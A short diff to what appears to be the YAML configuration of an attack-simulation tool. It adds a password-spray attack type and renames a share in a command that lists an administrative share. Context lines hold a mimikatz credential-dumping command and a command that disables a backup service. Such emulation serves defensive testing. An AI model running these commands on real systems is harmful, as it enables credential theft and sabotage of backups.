@@ -5,6 +5,7 @@ max_wave_size: 2
 attacks:
   - recon:browsing
   - email:malware_delivery
+  - identity:password_spray
 domain_themes:
   - martian
   - cosmic
@@ -79,7 +80,7 @@ post_exploit_commands:
   - name: cmd.exe
     process: "'mimikatz.exe':'sekurlsa::logonpasswords'"
   - name: cmd.exe
-    process: C:\Windows\system32\cmd.exe /C dir “\\BalloonSecrets\C$” /s >> mylist.txt
+    process: C:\Windows\system32\cmd.exe /C dir “\\Homework\C$” /s >> mylist.txt
   - name: cmd.exe
     process: cmd.exe sc  config "Netbackup Legacy Network service" start= disabled
   - name: cmd.exe
